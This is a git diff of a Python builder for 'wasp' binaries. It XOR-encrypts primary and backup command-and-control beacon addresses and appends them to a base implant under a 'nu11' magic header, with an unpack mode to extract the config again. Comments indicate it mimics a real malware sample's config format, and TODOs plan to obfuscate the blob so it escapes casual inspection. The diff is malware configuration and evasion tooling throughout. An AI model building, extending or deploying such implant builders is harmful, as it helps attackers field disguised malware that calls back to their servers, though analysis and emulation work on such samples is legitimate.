@@ -8,7 +8,7 @@ from urllib.parse import urlparse
 
 from datetime import datetime
 
-from typing import Optional, Dict
+from typing import NamedTuple, Optional, Dict, Tuple
 
 from pathlib import Path
 
@@ -25,10 +25,13 @@ class WaspBuildConfiguration(object):
     def __init__(
             self,
             beacon_url: str,
-            backup_beacon_url: str,
+            backup_beacon_url: Optional[str],
             ) -> None:
         self.beacon_url = beacon_url
-        self.backup_beacon_url = backup_beacon_url
+        if backup_beacon_url:
+            self.backup_beacon_url = backup_beacon_url
+        else:
+            self.backup_beacon_url = beacon_url
 
     @property
     def beacon_hostname(self) -> str:
@@ -81,93 +84,132 @@ class WaspBuildConfiguration(object):
         except KeyError as e:
             raise ValueError(f"Invalid wasp configuration. Missing key {e.args}")
 
-
-def build_wasp(
-        configuration: WaspBuildConfiguration,
-        output_path: Optional[Path] = None,
-        ) -> Path:
-    """ Build a wasp with the given configuration and return the path to the built wasp """
-
-    base_bytes = constants.WASP_BASE_BUILD.read_bytes()
-    config = {
-        "Master": {
-            "Domain": configuration.beacon_hostname,
-            #"IP": "127.0.0.1",
-            "Port": configuration.beacon_port
-        },
-        "Standby": {
-            "Domain": configuration.backup_beacon_hostname,
-            #"IP": "127.0.0.1",
-            "Port": configuration.backup_beacon_port,
+    def to_dict(self) -> Dict:
+        """ Convert this configuration to a dictionary """
+        return {
+            "Master": {
+                "Domain": self.beacon_hostname,
+                "Port": self.beacon_port
+            },
+            "Standby": {
+                "Domain": self.backup_beacon_hostname,
+                "Port": self.backup_beacon_port,
+            }
         }
-    }
 
-    config_json = json.dumps(config).encode('utf-8')
-    encrypted_config_json = b''
-    for index, b in enumerate(config_json):
-        # Not sure if the real implementation does the modulo
-        encrypted_config_json += struct.pack("B", (config_json[index] ^ cypher_bytes[index % len(cypher_bytes)]))
+    def to_json(self) -> str:
+        """ Convert this configuration to a JSON string """
+        return json.dumps(self.to_dict())
 
-    # Pack a struct with the flags, config length, config
-    flags = 0
-    config_length = len(config_json)
-    magic = b'nu11'
-    header_len = len(magic) + 4 + len(magic)
-    footer_size = 255 - header_len
-    wasp_config_struct = magic + struct.pack('!I', config_length) + magic + struct.pack(f'{footer_size}s', encrypted_config_json)
+    @classmethod
+    def split_wasp(cls, wasp_path: Path | bytes) -> Tuple[bytes, WaspBuildConfiguration]:
+        """ Given a wasp, split it into the header and the configuration """
+        if isinstance(wasp_path, Path):
+            wasp_bytes = wasp_path.read_bytes()
+        else:
+            wasp_bytes = wasp_path
 
-    # if the user did not specify an output path, we'll generate one
-    if not output_path:
-        date_str = datetime.utcnow().strftime("%Y%m%d%H%M%S")
-        output_path = constants.WASP_BUILDS_PATH / f"wasp-{date_str}"
-    output_path.parent.mkdir(parents=True, exist_ok=True)
-
-    output_path.write_bytes(base_bytes + wasp_config_struct)
-    Path(str(output_path) + ".config.json").write_bytes(config_json)
-    return output_path
-
-
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--unpack', action='store_true', help='Invert')
-    parser.add_argument('--strip-config', action='store_true', help='Output the base file without the config blob')
-    parser.add_argument("BASE_FILE", help="The file to hide our config in", type=Path)
-    parser.add_argument("OUTPUT_FILE", help="The file to save the config", type=Path)
-    args = parser.parse_args()
-
-
-    # Read the base file to hide in
-    base_bytes: bytes = args.BASE_FILE.read_bytes()
-
-    if args.unpack:
         magic = b'nu11'
 
-        second_null = base_bytes.rfind(magic)
-        first_null = base_bytes.rfind(magic, 0, second_null)
+        second_null = wasp_bytes.rfind(magic)
+        first_null = wasp_bytes.rfind(magic, 0, second_null)
         header_start = first_null
-        print(f"Header starts at byte {header_start}")
 
         header_len = len(magic) + 4 + len(magic)
         size = header_len + 255
-        config_footer = base_bytes[header_start:]
-        print(config_footer)
+        config_footer = wasp_bytes[header_start:]
         null, size, null = struct.unpack('!4sI4s', config_footer[:header_len])
-        print(f"Size: {size}")
         config_blob = struct.unpack(f'{size}s', config_footer[header_len:header_len+size])[0]
-        print(config_blob)
         decrypted_config_json = b''
         for index, b in enumerate(config_blob):
             # Not sure if the real implementation does the modulo
             decrypted_config_json += struct.pack("B", (config_blob[index] ^ cypher_bytes[index % len(cypher_bytes)]))
         config_json = json.loads(decrypted_config_json.decode('utf-8'))
-        print(config_json)
-        if args.strip_config:
-            args.OUTPUT_FILE.write_bytes(base_bytes[:header_start])
+        return wasp_bytes[:header_start], cls.from_dict(config_json)
+
+    @classmethod
+    def config_from_wasp(cls, wasp_path: Path) -> WaspBuildConfiguration:
+        """ Extract the configuration from a wasp """
+        return cls.split_wasp(wasp_path)[1]
+
+    def build_wasp(
+            self,
+            output_path: Optional[Path] = None,
+            base_wasp_path: Optional[Path] = None,
+            ) -> Path:
+        """ Build a wasp with the given configuration and return the path to the built wasp """
+
+        if base_wasp_path:
+            base_bytes = base_wasp_path.read_bytes()
         else:
-            args.OUTPUT_FILE.write_bytes(decrypted_config_json)
+            base_bytes = constants.WASP_BASE_BUILD.read_bytes()
+
+        config_json = self.to_json().encode('utf-8')
+
+        # TODO: Use the common cipher method from the comms module
+        encrypted_config_json = b''
+        for index, b in enumerate(config_json):
+            # Not sure if the real implementation does the modulo
+            encrypted_config_json += struct.pack("B", (config_json[index] ^ cypher_bytes[index % len(cypher_bytes)]))
+
+        # Pack a struct with the flags, config length, config
+        flags = 0
+        config_length = len(config_json)
+        magic = b'nu11'
+        header_len = len(magic) + 4 + len(magic)
+        footer_size = 255 - header_len
+
+        """
+        The final structure is:
+        4 byte magic (`nu11`)
+        4 byte config length
+        4 byte magic (`nu11`)
+        255 byte footer containing `footer_size` bytes of JSON followed by arbitrary bytes (`\x00` in the original sample)
+        """
+        # TODO: Replace the padding with data from earlier in the binary to obfuscate it from a cursory glance
+        # TODO: Replace the magic with our own value
+
+        wasp_config_struct = magic + struct.pack('!I', config_length) + magic + struct.pack(f'{footer_size}s', encrypted_config_json)
+
+        # if the user did not specify an output path, we'll generate one
+        if not output_path:
+            date_str = datetime.utcnow().strftime("%Y%m%d%H%M%S")
+            output_path = constants.WASP_BUILDS_PATH / f"wasp-{date_str}"
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        output_path.write_bytes(base_bytes + wasp_config_struct)
+        Path(str(output_path) + ".config.json").write_bytes(config_json)
+        return output_path
+
+
+def main():
+    parser = argparse.ArgumentParser()
+
+    unpack_group = parser.add_argument_group("Unpacking")
+    unpack_group.add_argument('--unpack', action='store_true', help='Invert')
+    unpack_group.add_argument('--strip-config', action='store_true', help='Output the base file without the config blob')
+
+    configuration_group = parser.add_argument_group("Configuration")
+    configuration_group.add_argument("--beacon-url", required=True, type=str, help="The URL of the primary C2 server. In the format wasp://<hostname>:<port>")
+    configuration_group.add_argument("--backup-beacon-url", required=False, type=str, help="The URL of the backup C2 server. In the format wasp://<hostname>:<port>")
+
+    parser.add_argument("--base-file", required=False, default=constants.WASP_BASE_BUILD, help=f"The file to hide our config in. Defaults to {constants.WASP_BASE_BUILD}", type=Path)
+    parser.add_argument("OUTPUT_FILE", help="The file to save the config", type=Path)
+    args = parser.parse_args()
+
+    # Read the base file to hide in
+    base_bytes: bytes = args.base_file.read_bytes()
+
+    if args.unpack:
+        # Extract the config and save it
+        header, config = WaspBuildConfiguration.split_wasp(base_bytes)
+        if args.strip_config:
+            args.OUTPUT_FILE.write_bytes(header)
+        else:
+            args.OUTPUT_FILE.write_bytes(config.to_json().encode('utf-8'))
         
     if not args.unpack:
         # Generate our configuration
-
-
-
+        config = WaspBuildConfiguration(args.beacon_url, args.backup_beacon_url)
+        # Build the wasp
+        config.build_wasp(args.OUTPUT_FILE, args.base_file)
